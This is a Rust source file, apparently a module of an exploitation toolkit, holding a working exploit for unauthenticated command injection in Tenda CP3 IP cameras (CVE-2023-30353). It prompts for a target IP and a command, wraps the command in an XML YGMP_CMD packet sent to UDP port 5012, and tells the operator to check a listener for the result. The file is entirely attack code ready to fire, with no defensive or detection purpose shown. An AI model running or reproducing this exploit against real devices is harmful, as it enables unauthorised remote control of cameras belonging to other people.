use anyhow::{Result, Context};
use colored::*;
use std::net::UdpSocket;
use std::time::Duration;
use crate::utils::{prompt_required, normalize_target, prompt_default};

/// Tenda CP3 IP Camera Unauthenticated RCE (CVE-2023-30353)
/// 
/// Exploits a command injection vulnerability in the `YGMP_CMD` message handled 
/// by the `multicast_thread` on UDP port 5012.
/// 
/// Target: UDP Port 5012
/// Vulnerable Parameter: <CMD> tag in XML payload.

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    // Determine target
    let raw_ip = if target.is_empty() {
        prompt_required("Target IP")?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    
    // Default port 5012
    let port = 5012;
    let target_addr = format!("{}:{}", target_ip, port);
    
    println!("{} Target: {}", "[*]".blue(), target_addr);
    
    let cmd = prompt_default("Command to execute", "id")?;
    
    println!("{} Sending malicious UDP packet...", "[*]".blue());
    
    // XML Payload construction
    let xml_payload = format!(
        "<YGMP_CMD>\n\
         <TARGET>127.0.0.1</TARGET>\n\
         <MAC>00:00:00:00:00:00</MAC>\n\
         <CMD>{}</CMD>\n\
         </YGMP_CMD>",
        cmd
    );
    
    // Send UDP packet
    // Note: This is UDP, so we might not get a response unless the command generates one 
    // or we use a reverse shell.
    
    let socket = UdpSocket::bind("0.0.0.0:0").context("Failed to bind UDP socket")?;
    socket.connect(&target_addr).context("Failed to connect to target")?;
    // Set a short read timeout just in case it replies
    socket.set_read_timeout(Some(Duration::from_secs(5)))?;
    
    socket.send(xml_payload.as_bytes()).context("Failed to send payload")?;
    
    println!("{} Payload sent!", "[+]".green());
    println!("{} Check your listener or device state.", "[*]".blue());
    println!("{} Payload preview:\n{}", "[*]".dimmed(), xml_payload);
    
    // Attempt to receive validation (unlikely for blind command injection, but possible)
    let mut buf = [0u8; 1024];
    match socket.recv(&mut buf) {
        Ok(n) => {
            let resp = String::from_utf8_lossy(&buf[..n]);
            println!("{} Response received: {}", "[+]".green(), resp);
        },
        Err(_) => {
           println!("{} No response received (UDP/Blind RCE). This is normal.", "[*]".yellow());
        }
    }

    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║      Tenda CP3 Camera Unauthenticated RCE (CVE-2023-30353)║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
